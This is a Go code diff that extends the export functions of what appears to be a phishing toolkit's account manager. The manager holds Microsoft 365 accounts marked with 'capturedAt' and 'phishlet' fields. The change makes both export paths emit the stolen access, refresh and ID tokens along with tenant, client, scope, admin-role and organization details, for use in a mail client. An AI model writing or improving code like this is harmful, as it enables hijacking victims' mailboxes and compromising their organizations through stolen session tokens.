@@ -614,20 +614,28 @@ func (m *MailboxAccountManager) ExportForMailbox() []map[string]interface{} {
 	result := make([]map[string]interface{}, 0, len(m.accounts))
 	for _, acc := range m.accounts {
 		result = append(result, map[string]interface{}{
-			"id":           acc.ID,
-			"feedId":       acc.ID,
-			"email":        acc.Email,
-			"displayName":  acc.DisplayName,
-			"accessToken":  acc.AccessToken,
-			"refreshToken": acc.RefreshToken,
-			"sessionId":    acc.SessionID,
-			"status":       acc.Status,
-			"capturedAt":   acc.CapturedAt.Format(time.RFC3339),
-			"lastRefresh":  acc.LastRefresh.Format(time.RFC3339),
-			"isAdmin":      acc.IsAdmin,
-			"adminRoles":   acc.AdminRoles,
-			"source":       acc.Source,
-			"phishlet":     acc.Phishlet,
+			"id":            acc.ID,
+			"feedId":        acc.ID,
+			"email":         acc.Email,
+			"displayName":   acc.DisplayName,
+			"accessToken":   acc.AccessToken,
+			"refreshToken":  acc.RefreshToken,
+			"idToken":       acc.IDToken,
+			"tokenExpiry":   acc.TokenExpiry.Format(time.RFC3339),
+			"tokenScope":    acc.TokenScope,
+			"clientId":      acc.ClientID,
+			"tenantId":      acc.TenantID,
+			"provider":      acc.Provider,
+			"sessionId":     acc.SessionID,
+			"status":        acc.Status,
+			"capturedAt":    acc.CapturedAt.Format(time.RFC3339),
+			"lastRefresh":   acc.LastRefresh.Format(time.RFC3339),
+			"isAdmin":       acc.IsAdmin,
+			"adminRoles":    acc.AdminRoles,
+			"organization":  acc.Organization,
+			"source":        acc.Source,
+			"phishlet":      acc.Phishlet,
+			"userPrincipal": acc.UserPrincipal,
 		})
 	}
 	return result
@@ -660,7 +668,7 @@ func (m *MailboxAccountManager) HandleAPIRequest(apiKey, requestKey, action stri
 		return string(data), 200
 
 	case "export":
-		// Export accounts in M365-Mail app compatible format
+		// Export accounts in M365-Mail app compatible format with full details
 		accounts := m.ListAccounts()
 		exportData := make([]map[string]interface{}, 0)
 		for _, acc := range accounts {
@@ -668,11 +676,19 @@ func (m *MailboxAccountManager) HandleAPIRequest(apiKey, requestKey, action stri
 				continue
 			}
 			exportData = append(exportData, map[string]interface{}{
-				"email":        acc.Email,
-				"displayName":  acc.DisplayName,
-				"accessToken":  acc.AccessToken,
-				"refreshToken": acc.RefreshToken,
-				"label":        acc.Email,
+				"email":         acc.Email,
+				"displayName":   acc.DisplayName,
+				"accessToken":   acc.AccessToken,
+				"refreshToken":  acc.RefreshToken,
+				"idToken":       acc.IDToken,
+				"tokenScope":    acc.TokenScope,
+				"clientId":      acc.ClientID,
+				"tenantId":      acc.TenantID,
+				"isAdmin":       acc.IsAdmin,
+				"adminRoles":    acc.AdminRoles,
+				"organization":  acc.Organization,
+				"userPrincipal": acc.UserPrincipal,
+				"label":         acc.Email,
 			})
 		}
 		data, _ := json.Marshal(map[string]interface{}{
